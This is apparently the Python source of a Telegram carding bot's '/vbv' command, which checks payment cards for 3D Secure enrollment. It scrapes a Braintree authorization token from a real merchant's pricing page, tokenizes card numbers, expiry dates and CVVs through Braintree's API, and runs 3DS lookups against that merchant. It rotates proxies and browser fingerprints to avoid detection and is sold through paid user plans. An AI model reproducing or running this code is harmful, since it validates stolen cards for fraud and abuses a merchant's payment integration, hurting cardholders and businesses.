# BOT/gates/vbv/bvbv.py
# Braintree 3D Secure (VBV) Checker - Compatible with WAYNE Bot Structure

import json
import asyncio
import re
import time
import httpx
import random
import string
import base64
import uuid
import os
from datetime import datetime, timedelta
from pyrogram import Client, filters
from pyrogram.types import Message
import html

# Import from helper modules
try:
    from BOT.helper.permissions import auth_and_free_restricted
    from BOT.helper.start import load_users, save_users
    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
    from BOT.tools.proxy import get_proxy, format_proxy_for_httpx
    from BOT.helper.filter import extract_cards
except ImportError:
    # Dummy functions for standalone testing
    def auth_and_free_restricted(func):
        return func
    
    def is_command_disabled(cmd):
        return False
    
    def get_command_offline_message(cmd):
        return "Command is temporarily disabled."
    
    def get_proxy():
        return None
    
    def format_proxy_for_httpx(proxy):
        return None
    
    def load_users():
        return {}
    
    def save_users(users):
        pass
    
    def extract_cards(text):
        cards = []
        for line in text.splitlines():
            parts = line.split('|')
            if len(parts) >= 4:
                cards.append(line.strip())
        return cards, list(set(cards))

# Custom logger with emoji formatting
class EmojiLogger:
    def info(self, message): print(f"🔹 {message}")
    def success(self, message): print(f"✅ {message}")
    def warning(self, message): print(f"⚠️ {message}")
    def error(self, message): print(f"❌ {message}")
    def step(self, step_num, total_steps, message): print(f"🔸 [{step_num}/{total_steps}] {message}")
    def network(self, message): print(f"🌐 {message}")
    def card(self, message): print(f"💳 {message}")
    def debug_response(self, message): print(f"🔧 {message}")
    def bin_info(self, message): print(f"🏦 {message}")
    def user(self, message): print(f"👤 {message}")
    def proxy(self, message): print(f"🔌 {message}")

logger = EmojiLogger()

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            config_data = json.load(f)
            return config_data.get("OWNER_ID") or config_data.get("OWNER")
    except:
        return None

def get_user_plan(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str in users:
        return users[user_id_str].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        if not os.path.exists("DATA/banned_users.txt"):
            return False
        with open("DATA/banned_users.txt", "r") as f:
            banned_users = f.read().splitlines()
        return str(user_id) in banned_users
    except:
        return False

def check_cooldown(user_id, command_type="vbv"):
    """Check cooldown for user - SKIP FOR OWNER"""
    owner_id = load_owner_id()
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except:
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15)

        if antispam is None:
            antispam = 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except:
        pass

    return True, 0

# Braintree VBV Error Codes and Messages
BRAINTREE_ERRORS = {
    "81571": "Failed to authenticate, please try a different form of payment",
    "81572": "3D Secure authentication failed",
    "81573": "Cardholder not enrolled in 3D Secure",
    "81574": "3D Secure authentication unavailable",
    "81575": "3D Secure authentication timed out",
    "81576": "3D Secure issuer rejected authentication",
    "2000": "Do Not Honor",
    "2001": "Insufficient Funds",
    "2002": "Limit Exceeded",
    "2003": "Cardholder's Activity Limit Exceeded",
    "2004": "Cardholder's Withdrawal Limit Exceeded",
    "2005": "Card Not Activated",
    "2006": "Invalid Card Number",
    "2007": "Invalid Expiration Date",
    "2008": "Invalid CVV",
    "2009": "Invalid Card Type",
    "2010": "Invalid Transaction",
    "2011": "Duplicate Transaction",
    "2012": "Amount Mismatch",
    "2013": "Invalid Amount",
    "2014": "Card Expired",
    "2015": "Card Lost/Stolen",
    "2016": "Card Restricted",
    "2017": "Security Violation",
    "2018": "Processor Unavailable",
    "2019": "Internal System Error",
    "2020": "Transaction Not Permitted",
}

class BraintreeVBVChecker:
    def __init__(self):
        # Modern browser user agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
        ]
        self.user_agent = random.choice(self.user_agents)
        
        # Target site from the provided logs
        self.base_url = "https://www.locoloader.com"
        self.pricing_url = f"{self.base_url}/pricing/"
        self.braintree_graphql = "https://payments.braintree-api.com/graphql"
        self.braintree_api = "https://api.braintreegateway.com"
        
        # Merchant ID from logs
        self.merchant_id = "3bbxc2hs5sgbs95q"
        
        # Country code to name mapping
        self.country_map = {
            'US': 'UNITED STATES', 'GB': 'UNITED KINGDOM', 'CA': 'CANADA', 'AU': 'AUSTRALIA',
            'DE': 'GERMANY', 'FR': 'FRANCE', 'IT': 'ITALY', 'ES': 'SPAIN', 'NL': 'NETHERLANDS',
            'JP': 'JAPAN', 'SG': 'SINGAPORE', 'AE': 'UAE', 'IN': 'INDIA', 'BR': 'BRAZIL',
            'MX': 'MEXICO', 'CN': 'CHINA', 'HK': 'HONG KONG', 'KR': 'SOUTH KOREA',
            'RU': 'RUSSIA', 'CH': 'SWITZERLAND', 'SE': 'SWEDEN', 'NO': 'NORWAY',
        }
        
        # Currency mapping
        self.currency_map = {
            'US': 'USD', 'GB': 'GBP', 'CA': 'CAD', 'AU': 'AUD', 'DE': 'EUR', 
            'FR': 'EUR', 'IT': 'EUR', 'ES': 'EUR', 'NL': 'EUR', 'JP': 'JPY',
            'SG': 'SGD', 'AE': 'AED', 'IN': 'INR', 'BR': 'BRL', 'MX': 'MXN',
            'CN': 'CNY', 'HK': 'HKD', 'KR': 'KRW', 'RU': 'RUB', 'CH': 'CHF',
            'SE': 'SEK', 'NO': 'NOK',
        }
        
        # Email domains
        self.email_domains = [
            "gmail.com", "yahoo.com", "outlook.com", "hotmail.com", 
            "protonmail.com", "mail.com", "yandex.com", "aol.com"
        ]
        
        # BIN cache
        self.bin_cache = {}
        self.last_bin_request = 0
        
        # Session ID
        self.session_id = str(uuid.uuid4())
        self.df_reference_id = None
        
    def get_country_emoji(self, country_code):
        country_emojis = {
            'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
            'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'JP': '🇯🇵', 'CN': '🇨🇳',
            'IN': '🇮🇳', 'BR': '🇧🇷', 'MX': '🇲🇽', 'RU': '🇷🇺', 'KR': '🇰🇷',
            'NL': '🇳🇱', 'CH': '🇨🇭', 'SE': '🇸🇪', 'AE': '🇦🇪', 'SG': '🇸🇬',
        }
        return country_emojis.get(country_code.upper() if country_code else 'N/A', '🏳️')
    
    def get_currency(self, country_code):
        return self.currency_map.get(country_code.upper() if country_code else 'US', 'USD')
    
    def generate_random_email(self):
        random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        domain = random.choice(self.email_domains)
        return f"{random_string}@{domain}"
    
    def generate_session_id(self):
        self.session_id = str(uuid.uuid4())
        return self.session_id
    
    async def get_bin_info(self, cc):
        if not cc or len(cc) < 6:
            return self.get_default_bin_info()
        
        bin_number = cc[:6]
        
        if bin_number in self.bin_cache:
            return self.bin_cache[bin_number]
        
        now = time.time()
        if now - self.last_bin_request < 1.0:
            await asyncio.sleep(1.0)
        self.last_bin_request = time.time()
        
        try:
            url = f"https://bins.antipublic.cc/bins/{bin_number}"
            headers = {'User-Agent': self.user_agent}
            
            async with httpx.AsyncClient(timeout=10.0) as client:
                response = await client.get(url, headers=headers)
                
                if response.status_code == 200:
                    data = response.json()
                    country_code = data.get('country', 'N/A')
                    country_name = self.country_map.get(country_code, country_code)
                    flag_emoji = self.get_country_emoji(country_code)
                    currency = self.get_currency(country_code)
                    
                    card_type = str(data.get('type', 'N/A')).upper()
                    scheme = str(data.get('brand', 'N/A')).upper()
                    
                    commercial = data.get('commercial', 'UNKNOWN')
                    if commercial == 'YES':
                        business_status = "BUSINESS"
                    elif commercial == 'NO':
                        business_status = "CONSUMER"
                    else:
                        business_status = "UNKNOWN"
                    
                    if card_type == "DEBIT":
                        card_category = "DEBIT"
                    elif card_type == "CREDIT":
                        card_category = "CREDIT"
                    else:
                        card_category = card_type
                    
                    result = {
                        'scheme': scheme,
                        'type': card_type,
                        'brand': str(data.get('brand', 'N/A')),
                        'bank': str(data.get('bank', 'N/A')) if data.get('bank') else 'N/A',
                        'country': country_name,
                        'country_code': country_code,
                        'emoji': flag_emoji,
                        'currency': currency,
                        'business_status': business_status,
                        'card_category': card_category,
                    }
                    self.bin_cache[bin_number] = result
                    return result
        except Exception as e:
            logger.warning(f"BIN lookup failed: {e}")
        
        return self.get_default_bin_info()
    
    def get_default_bin_info(self):
        return {
            'scheme': 'N/A', 'type': 'N/A', 'brand': 'N/A',
            'bank': 'N/A', 'country': 'N/A', 'country_code': 'N/A', 
            'emoji': '🏳️', 'currency': 'USD', 'business_status': 'UNKNOWN',
            'card_category': 'UNKNOWN',
        }
    
    async def get_authorization_fingerprint(self, client):
        try:
            logger.step(1, 5, "Fetching authorization fingerprint...")
            
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'user-agent': self.user_agent,
                'cache-control': 'no-cache',
                'pragma': 'no-cache',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'upgrade-insecure-requests': '1',
            }
            
            response = await client.get(self.pricing_url, headers=headers, follow_redirects=True)
            
            if response.status_code != 200:
                return None, f"Failed to load pricing page: {response.status_code}"
            
            content = response.text
            
            pattern = r"authorization:\s+'([^']+)'"
            match = re.search(pattern, content)
            
            if not match:
                pattern = r'authorization["\']?\s*:\s*["\']([^"\']+)["\']'
                match = re.search(pattern, content)
            
            if not match:
                return None, "Could not extract authorization token"
            
            auth_token = match.group(1)
            
            try:
                decoded = base64.b64decode(auth_token).decode('utf-8')
                fingerprint_pattern = r'"authorizationFingerprint":"([^"]+)"'
                fp_match = re.search(fingerprint_pattern, decoded)
                
                if fp_match:
                    fingerprint = fp_match.group(1)
                    logger.success("Authorization fingerprint extracted successfully")
                    return fingerprint, None
                else:
                    return None, "Could not extract fingerprint from token"
            except:
                return None, "Failed to decode authorization token"
                
        except Exception as e:
            return None, f"Error getting fingerprint: {str(e)}"
    
    async def tokenize_credit_card(self, client, fingerprint, card_details):
        try:
            logger.step(2, 5, "Tokenizing credit card...")
            
            cc, mes, ano, cvv = card_details
            
            if len(ano) == 2:
                ano_full = '20' + ano
            else:
                ano_full = ano
            
            graphql_query = """
            mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                tokenizeCreditCard(input: $input) {
                    token
                    creditCard {
                        bin
                        brandCode
                        last4
                        expirationMonth
                        expirationYear
                    }
                }
            }
            """
            
            headers = {
                'accept': '*/*',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'authorization': f'Bearer {fingerprint}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': self.user_agent,
            }
            
            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': self.session_id,
                },
                'query': graphql_query,
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mes,
                            'expirationYear': ano_full,
                            'cvv': cvv,
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            
            response = await client.post(
                self.braintree_graphql,
                headers=headers,
                json=json_data,
                timeout=30.0
            )
            
            if response.status_code != 200:
                return None, f"Tokenization failed: HTTP {response.status_code}"
            
            data = response.json()
            
            if 'errors' in data:
                error_msg = data['errors'][0].get('message', 'Unknown error')
                return None, f"Braintree error: {error_msg}"
            
            if 'data' in data and 'tokenizeCreditCard' in data['data']:
                token = data['data']['tokenizeCreditCard']['token']
                card_info = data['data']['tokenizeCreditCard'].get('creditCard', {})
                
                logger.success(f"Card tokenized: {token}")
                
                return {
                    'token': token,
                    'bin': card_info.get('bin', cc[:6]),
                    'last4': card_info.get('last4', cc[-4:]),
                    'brand': card_info.get('brandCode', 'N/A'),
                }, None
            else:
                return None, "Unexpected response format"
                
        except Exception as e:
            return None, f"Tokenization error: {str(e)}"
    
    async def three_d_secure_lookup(self, client, fingerprint, token_data, amount, email):
        try:
            logger.step(3, 5, "Performing 3D Secure lookup...")
            
            cc_bin = token_data['bin']
            
            df_reference_id = f"0_{str(uuid.uuid4())}"
            self.df_reference_id = df_reference_id
            
            headers = {
                'accept': '*/*',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/json',
                'origin': self.base_url,
                'referer': f'{self.base_url}/pricing/',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': self.user_agent,
            }
            
            lookup_data = {
                'amount': str(amount),
                'additionalInfo': {
                    'email': email,
                },
                'bin': cc_bin,
                'authorizationFingerprint': fingerprint,
                'braintreeLibraryVersion': 'braintree/web/3.84.0',
                'clientMetadata': {
                    'requestedThreeDSecureVersion': '2',
                    'sdkVersion': 'web/3.84.0',
                    'cardinalDeviceDataCollectionTimeElapsed': random.randint(500, 1000),
                    'issuerDeviceDataCollectionResult': True,
                    'issuerDeviceDataCollectionTimeElapsed': random.randint(3000, 5000),
                },
                'dfReferenceId': df_reference_id,
                '_meta': {
                    'merchantAppId': 'www.locoloader.com',
                    'platform': 'web',
                    'sdkVersion': '3.84.0',
                    'source': 'client',
                    'integration': 'custom',
                    'integrationType': 'custom',
                    'sessionId': self.session_id,
                }
            }
            
            response = await client.post(
                f'{self.braintree_api}/merchants/{self.merchant_id}/client_api/v1/payment_methods/{token_data["token"]}/three_d_secure/lookup',
                headers=headers,
                json=lookup_data,
                timeout=30.0
            )
            
            if response.status_code != 201 and response.status_code != 200:
                return None, f"3DS lookup failed: HTTP {response.status_code}"
            
            data = response.json()
            
            if 'paymentMethod' in data:
                payment_method = data['paymentMethod']
                
                if 'threeDSecureInfo' in payment_method:
                    tds_info = payment_method['threeDSecureInfo']
                    status = tds_info.get('status', 'unknown')
                    liability_shifted = tds_info.get('liabilityShifted', False)
                    
                    # Determine message and 3D status
                    if status == 'challenge_required':
                        message = "challenge_required"
                        three_d_status = "𝑭𝑨𝑳𝑺𝑬! ✅"
                    elif liability_shifted:
                        message = "authenticate_successful"
                        three_d_status = "𝑻𝑹𝑼𝑬 ✅"
                    else:
                        message = status.replace('_', ' ').title()
                        three_d_status = "𝑭𝑨𝑳𝑺𝑬 ❌"
                    
                    nonce = payment_method.get('nonce')
                    details = payment_method.get('details', {})
                    
                    result = {
                        'nonce': nonce,
                        'status': status,
                        'message': message,
                        'three_d_status': three_d_status,
                        'liability_shifted': liability_shifted,
                        'details': details,
                    }
                    
                    return result, None
                else:
                    return None, "No 3DS info in response"
            else:
                return None, "Unexpected response format"
                
        except Exception as e:
            return None, f"3DS lookup error: {str(e)}"
    
    async def send_payment_feedback(self, client, email):
        try:
            headers = {
                'accept': '*/*',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': self.base_url,
                'referer': f'{self.base_url}/pricing/',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': self.user_agent,
                'x-requested-with': 'XMLHttpRequest',
            }
            
            data = {
                'email': email,
                'plan': '12m1u_60'
            }
            
            await client.post(
                f'{self.base_url}/api-payment-feedback/',
                headers=headers,
                data=data,
                timeout=30.0
            )
            
        except Exception as e:
            logger.warning(f"Feedback error: {str(e)}")
    
    async def check_card(self, card_details, username, user_data):
        start_time = time.time()
        logger.info(f"🔍 Starting Braintree 3DS check: {card_details}")
        
        random_email = self.generate_random_email()
        logger.user(f"Using email: {random_email}")
        
        proxy_status = "Live ⚡️"
        
        try:
            cc_parts = card_details.split('|')
            if len(cc_parts) < 4:
                return await self.format_response("", "", "", "", "ERROR", "Invalid card format", username, time.time()-start_time, user_data, proxy_status=proxy_status)
            
            cc = cc_parts[0].strip().replace(" ", "")
            mes = cc_parts[1].strip()
            ano = cc_parts[2].strip()
            cvv = cc_parts[3].strip()
            
            # Format year for display (2-digit)
            if len(ano) == 4:
                ano_display = ano[-2:]
            else:
                ano_display = ano
            
            if not cc.isdigit() or len(cc) < 15:
                return await self.format_response(cc, mes, ano_display, cvv, "ERROR", "Invalid card number", username, time.time()-start_time, user_data, proxy_status=proxy_status)
            
            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                return await self.format_response(cc, mes, ano_display, cvv, "ERROR", "Invalid month", username, time.time()-start_time, user_data, proxy_status=proxy_status)
            
            if not ano.isdigit() or len(ano) not in [2, 4]:
                return await self.format_response(cc, mes, ano_display, cvv, "ERROR", "Invalid year", username, time.time()-start_time, user_data, proxy_status=proxy_status)
            
            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                return await self.format_response(cc, mes, ano_display, cvv, "ERROR", "Invalid CVV", username, time.time()-start_time, user_data, proxy_status=proxy_status)
            
            bin_info = await self.get_bin_info(cc)
            logger.bin_info(f"BIN: {cc[:6]} | {bin_info['scheme']} | {bin_info['bank']}")
            
            proxy = get_proxy()
            proxy_url = format_proxy_for_httpx(proxy) if proxy else None
            
            if proxy:
                proxy_status = "Live ⚡️"
                logger.proxy(f"Using proxy: {proxy.get('ip', 'unknown')}:{proxy.get('port', 'unknown')}")
            else:
                proxy_status = "No Proxy"
            
            client_kwargs = {
                'timeout': 45.0,
                'follow_redirects': True,
                'http2': True
            }
            
            if proxy_url:
                client_kwargs['proxies'] = proxy_url
            
            self.generate_session_id()
            
            async with httpx.AsyncClient(**client_kwargs) as client:
                
                fingerprint, error = await self.get_authorization_fingerprint(client)
                if error or not fingerprint:
                    return await self.format_response(cc, mes, ano_display, cvv, "DECLINED", error or "Failed", username, time.time()-start_time, user_data, bin_info, proxy_status=proxy_status)
                
                token_data, error = await self.tokenize_credit_card(client, fingerprint, (cc, mes, ano, cvv))
                if error or not token_data:
                    return await self.format_response(cc, mes, ano_display, cvv, "DECLINED", error or "Failed", username, time.time()-start_time, user_data, bin_info, proxy_status=proxy_status)
                
                tds_result, error = await self.three_d_secure_lookup(
                    client, fingerprint, token_data, "1.00", random_email
                )
                
                if error or not tds_result:
                    return await self.format_response(cc, mes, ano_display, cvv, "DECLINED", error or "Failed", username, time.time()-start_time, user_data, bin_info, proxy_status=proxy_status)
                
                await self.send_payment_feedback(client, random_email)
                
                elapsed_time = time.time() - start_time
                
                message = tds_result.get('message', 'Unknown')
                three_d_status = tds_result.get('three_d_status', "𝑭𝑨𝑳𝑺𝑬 ❌")
                
                if "challenge_required" in message:
                    status_display = "DECLINED"
                elif tds_result.get('liability_shifted', False):
                    status_display = "APPROVED"
                else:
                    status_display = "DECLINED"
                
                logger.success(f"Check completed in {elapsed_time:.2f}s - {three_d_status}")
                
                return await self.format_response(
                    cc, mes, ano_display, cvv, status_display, message, 
                    username, elapsed_time, user_data, bin_info,
                    three_d_status, proxy_status
                )
                
        except Exception as e:
            logger.error(f"Unexpected error: {str(e)}")
            return await self.format_response(cc, mes, ano_display, cvv, "ERROR", "System error", username, time.time()-start_time, user_data, proxy_status="Error")
    
    async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info=None, three_d_status="𝑭𝑨𝑳𝑺𝑬 ❌", proxy_status="Live ⚡️"):
        """Format response in bot UI style"""
        if bin_info is None:
            bin_info = self.get_default_bin_info()
        
        safe_bin_info = {
            'scheme': str(bin_info.get('scheme', 'N/A')),
            'type': str(bin_info.get('type', 'N/A')),
            'brand': str(bin_info.get('brand', 'N/A')),
            'bank': str(bin_info.get('bank', 'N/A')) if bin_info.get('bank') else 'N/A',
            'country': str(bin_info.get('country', 'N/A')),
            'country_code': str(bin_info.get('country_code', 'N/A')),
            'emoji': str(bin_info.get('emoji', '🏳️')),
            'currency': str(bin_info.get('currency', 'USD')),
            'business_status': str(bin_info.get('business_status', 'UNKNOWN')),
            'card_category': str(bin_info.get('card_category', 'UNKNOWN')),
        }
        
        first_name = html.escape(str(user_data.get("first_name", "User")))
        badge = user_data.get("plan", {}).get("badge", "🧿")
        plan_name = user_data.get("plan", {}).get("plan", "Free User")
        
        # Clean name
        clean_name = re.sub(r'[↯⌁«~∞🍁]', '', first_name).strip()
        user_display = f"{badge}{clean_name}"
        
        bank_info = safe_bin_info['bank'].upper() if safe_bin_info['bank'] != 'N/A' else 'NETWORK ONLY'
        
        # Build response in bot UI format
        response = f"""「$cmd → /vbv」| WAYNE ✦
━━━━━━━━━━━━━━━
[•] Card- {cc}|{mes}|{ano}|{cvv}
[•] Gateway - 𝑩𝒓𝒂𝒊𝒏𝒕𝒓𝒆𝒆 𝟑𝑫 ♻️
[•] Status- 𝟑𝑫 -» {three_d_status}
[•] Response- {message}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
[+] Bin: {cc[:6]}  
[+] Info: {safe_bin_info['card_category']} - {safe_bin_info['scheme']} - {safe_bin_info['business_status']}
[+] Bank: {bank_info} 🏦
[+] Country: {safe_bin_info['country']} - [{safe_bin_info['emoji']}]
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
[ﾒ] Checked By: {user_display} [{plan_name}]
[ϟ] Dev ➺ DADYY
━━━━━━━━━━━━━━━
[ﾒ] T/t: [{elapsed_time:.2f} 𝐬] |P/x: [{proxy_status}]"""
        
        return response


# Command handler for /vbv
@Client.on_message(filters.command(["vbv", ".vbv", "$vbv"]))
@auth_and_free_restricted
async def handle_braintree_vbv(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)
        
        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')
        
        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return
        
        if is_user_banned(user_id):
            await message.reply("""<pre>⛔ User Banned</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You have been banned from using this bot.
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return
        
        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>🔒 Registration Required</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You need to register first with /register
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return
        
        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")
        
        args = message.text.split()
        if len(args) < 2:
            if message.reply_to_message and message.reply_to_message.text:
                all_cards, unique_cards = extract_cards(message.reply_to_message.text)
                if unique_cards:
                    card_details = unique_cards[0]
                else:
                    await message.reply("""「$cmd → /vbv」| WAYNE ✦
━━━━━━━━━━━━━━━
[•] Error - Invalid Format
[•] Message: No valid cards found in replied message.
[•] Usage: <code>/vbv cc|mm|yy|cvv</code>
[•] Example: <code>/vbv 4985032078775909|03|27|876</code>
━━━━━━━━━━━━━━━""")
                    return
            else:
                await message.reply("""「$cmd → /vbv」| WAYNE ✦
━━━━━━━━━━━━━━━
[•] Error - Invalid Format
[•] Message: Please provide a card or reply to a message containing cards.
[•] Usage: <code>/vbv cc|mm|yy|cvv</code>
[•] Example: <code>/vbv 4985032078775909|03|27|876</code>
━━━━━━━━━━━━━━━""")
                return
        else:
            card_details = args[1].strip()
        
        processing_msg = await message.reply(
            f"""「$cmd → /vbv」| WAYNE ✦
━━━━━━━━━━━━━━━
[•] Card- {card_details}
[•] Gateway - 𝑩𝒓𝒂𝒊𝒏𝒕𝒓𝒆𝒆 𝟑𝑫 ♻️
[•] Status- Processing... ⏳
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
[+] Plan: {plan_name}
[+] User: @{username}
━━━━━━━━━━━━━━━
<b>Checking 3DS verification... Please wait.</b>"""
        )
        
        checker = BraintreeVBVChecker()
        result = await checker.check_card(card_details, username, user_data)
        
        await processing_msg.edit_text(result, disable_web_page_preview=True)
        
    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""「$cmd → /vbv」| WAYNE ✦
━━━━━━━━━━━━━━━
[•] Error - System Error
[•] Message: {error_msg}
━━━━━━━━━━━━━━━
[ϟ] Dev ➺ DADYY
━━━━━━━━━━━━━━━""")


@Client.on_message(filters.command(["vbv"], prefixes="."))
async def handle_dot_vbv(client: Client, message: Message):
    await handle_braintree_vbv(client, message)